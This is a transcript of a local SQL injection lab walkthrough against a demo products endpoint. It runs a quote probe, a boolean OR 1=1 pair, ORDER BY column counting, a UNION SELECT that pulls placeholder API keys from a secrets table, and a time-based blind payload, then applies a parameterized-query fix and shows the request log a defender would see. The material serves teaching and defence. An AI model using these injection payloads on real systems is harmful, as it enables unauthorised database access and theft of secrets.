=== b-sqli walkthrough transcript ===
date: 2026-10-09  python: Python 3.12.3  curl: curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.10
env: loopback only, no Docker on this machine (labeled local demo)

--- step 1: start vulnerable app + baseline ---
sqli demo on 127.0.0.1:8323 FIXED=False
$ curl -G --data-urlencode 'category=Gifts' localhost:8323/products
[{'name': 'Teddy Bear', 'category': 'Gifts'}, {'name': 'Mug', 'category': 'Gifts'}]

--- step 2: quote probe ---
$ curl -G --data-urlencode "category=Gifts'" localhost:8323/products
database error: unrecognized token: "'Gifts''"

--- step 3: boolean pair ---
$ ... category=Gifts' OR 1=1--  (vs 1=2)
[{'name': 'Teddy Bear', 'category': 'Gifts'}, {'name': 'Mug', 'category': 'Gifts'}, {'name': 'Laptop', 'category': 'Electronics'}, {'name': 'Phone', 'category': 'Electronics'}]
[{'name': 'Teddy Bear', 'category': 'Gifts'}, {'name': 'Mug', 'category': 'Gifts'}]

--- step 4: column count via ORDER BY ---
ORDER BY 1 -> HTTP 200
ORDER BY 2 -> HTTP 200
ORDER BY 3 -> HTTP 500

--- step 5: UNION extraction (read-only, one table) ---
[{'name': 'Mug', 'category': 'Gifts'}, {'name': 'Teddy Bear', 'category': 'Gifts'}, {'name': 'admin', 'category': 'sk-live-abc123'}, {'name': 'backup', 'category': 'sk-live-def456'}]

--- step 6: time-based blind channel ---
(AND short-circuits, so the delay rides on rows matching category='Gifts')
$ time curl ... category=' OR category='Gifts' AND sleeps(2)--

real	0m4.016s
user	0m0.001s
sys	0m0.007s
$ time curl ... category=' OR category='Gifts' AND sleeps(0)--

real	0m0.018s
user	0m0.006s
sys	0m0.005s

--- step 7: apply fix (parameterized query), restart ---
sqli demo on 127.0.0.1:8323 FIXED=True
--- step 8: verify fix, four cases ---
[baseline] category=Gifts:
[{'name': 'Teddy Bear', 'category': 'Gifts'}, {'name': 'Mug', 'category': 'Gifts'}]
[quote] category=Gifts':
[]
[boolean 1=1]:
[]
[boolean 1=2]:
[]
[UNION]:
[]

--- step 9: defender view (request log) ---
GET /products?category=Gifts -> done
GET /products?category=Gifts%27 -> done
GET /products?category=Gifts%27+OR+1%3d1--+ -> done
GET /products?category=Gifts%27+OR+1%3d2--+ -> done
GET /products?category=Gifts%27+UNION+SELECT+owner%2c+api_key+FROM+secrets--+ -> done

=== end transcript ===
